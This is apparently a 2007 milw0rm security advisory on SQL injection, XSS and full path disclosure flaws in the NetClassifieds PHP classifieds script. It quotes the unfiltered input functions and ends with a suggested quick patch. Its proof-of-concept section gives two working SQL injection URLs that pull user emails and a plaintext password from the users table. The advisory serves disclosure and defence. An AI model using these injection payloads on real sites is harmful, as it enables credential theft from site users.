@@ -1,0 +1,187 @@
+Application: NetClassifieds:
+-Free Edition
+-Standard Edition
+-Professional Edition
+-Premium Edition
+Web Site: http://www.scriptdevelopers.net/
+Versions: all
+Platform: linux, windows
+Bug: multiple injection sql , xss , full path
+Fix Available: Yes
+
+
+-------------------------------------------------------
+
+1) Introduction
+2) Bug
+3) The Code
+4) Proof of concept
+5) Fix
+6)Conclusion
+
+===========
+1) Introduction
+===========
+
+"NetClassifieds Premium Edition has been built on the premise of making every
+classifieds site feel like it was custom written for the purpose for which it's being used.
+Automotive Sites, Horse Sites, Reality Sites, General Classifieds Sites or any other type
+of classifieds site you can think of will find a perfect match in NetClassifieds"
+
+======
+2) Bug
+======
+
+injection sql , xss , full path
+
+===============
+3) Vulnerable code:
+===============
+in Common.php
+
+line 310:
+
+function CCStrip($value)
+{
+if(get_magic_quotes_gpc() == 0)
+return $value;
+else
+return stripslashes($value); // ==> wtf... 0-o
+}
+
+
+
+ligne 350:
+
+function CCGetFromPost($parameter_name, $default_value)
+{
+global $HTTP_POST_VARS;
+
+$parameter_value = "";
+if(isset($HTTP_POST_VARS[$parameter_name]))
+$parameter_value = CCStrip($HTTP_POST_VARS[$parameter_name]);
+else
+$parameter_value = $default_value;
+
+return $parameter_value;
+}
+
+
+line 365:
+
+function CCGetFromGet($parameter_name, $default_value)
+{
+global $HTTP_GET_VARS;
+
+$parameter_value = "";
+if(isset($HTTP_GET_VARS[$parameter_name]))
+$parameter_value = CCStrip($HTTP_GET_VARS[$parameter_name]);
+else
+$parameter_value = $default_value;
+
+return $parameter_value;
+}
+
+nothing is filtred ....
+
+let's see how it goes in viewcat.php:
+
+line 63:
+include(RelativePath . "/Common.php");
+
+line 519:
+$this->ds->Parameters["urlCatID"] = CCGetFromGet("CatID", "");
+
+line 909:
+$catdb1 = new clsDBNetConnect;
+
+$catdb1->connect();
+
+$newSQL1 = "SELECT cat_id FROM categories WHERE sub_cat_id='" . CCGetFromGet("CatID", "") . "'";
+
+$incat = "'" . CCGetFromGet("CatID", "") . "'";
+
+
+I wont past every line of this code , because EVERY parameter is vulnerable to sql injection , XSS , full path ...
+
+=====
+4)proof of concept
+=====
+
+
+exemple of exploitation :
+1) http://site.com/ViewCat.php?CatID=-8+union+select+1,email,3+from+users/*
+==> ( Database error: Invalid SQL: SELECT name, sub_cat_id, cat_id FROM categories WHERE cat_id=username@mail.com )
+
+2)http://site.com/ViewCat.php?s_user_id='+union+select+user_password+from+users+where%20user_id=1/*
+==> The value in field urls_user_id is not valid. (passwd_PLAIN_TEXT)
+
+// there's absolutly no encryption in this script for stored password , or sensitive data ...
+
+every input are vulnerable to XSS attacks ( there's maybe 40 inputs ... ) via mysql errors , php error , and via
+various unfiltred forms .
+=====
+5) Fix
+=====
+scriptdevelopers has been advised , i dont think they will release any patch at the moment .
+
+here's my "quick patch" :
+
+1) in Common.php:
+line 30 :
+ADD:
+ini_set(display_errors,"0");
+( in a production mode , no one needs to know your errors .. and this avoid xss via php error )
+
+ligne 350:
+function CCGetFromPost // for every POST request
+avant : return $parameter_value;
+apres : return preg_replace('/[^a-z0-9]/i', '', $parameter_value); //only 0 to 9 and a to z caracters allowed
+
+
+line 365:
+function CCGetFromGet // for every GET request
+replace :
+return $parameter_value;
+BY
+return preg_replace('/[^a-z0-9]/i', '', $parameter_value);
+
+2) in Mysql_db.php
+line 52 :
+var $Halt_On_Error = "yes"; ## "yes" (halt with message), "no" (ignore errors quietly), "report" (ignore errror, but spit a warning)
+
+set the value at "no" ( by default it's yes )
+this will avoid juicy errors , such as table name and the complete query
+
+3) imageresizer.php
+
+line 2:
+ADD :
+ini_set(display_errors,"0");
+( same reason as Common.php )
+
+line 100 :
+replace : echo("<hr color='red'><font color='red'><b>$msg</b></font><br> file=<b>".__FILE__."</b><hr color='red'>")
+BY
+echo("<hr color='red'><font color='red'><b>error while processing your request</b></font><br> <b></b><hr color='red'>");
+
+".__FILE__." show the full path, no one need to know where is located your script on the server .
+and usually a full path give the username for the ftp , or cpanel .
+( /directory/your_user/www/file.php )
+
+
+=====
+5) Conclusion
+=====
+
+This script has not been develloped in a secure way, and it's dangerous
+to use it UNPATCHED
+
+
+
+
+
+regards laurent gaffie
+contact : laurent.gaffie@gmail.com
+
+# milw0rm.com [2007-06-22]
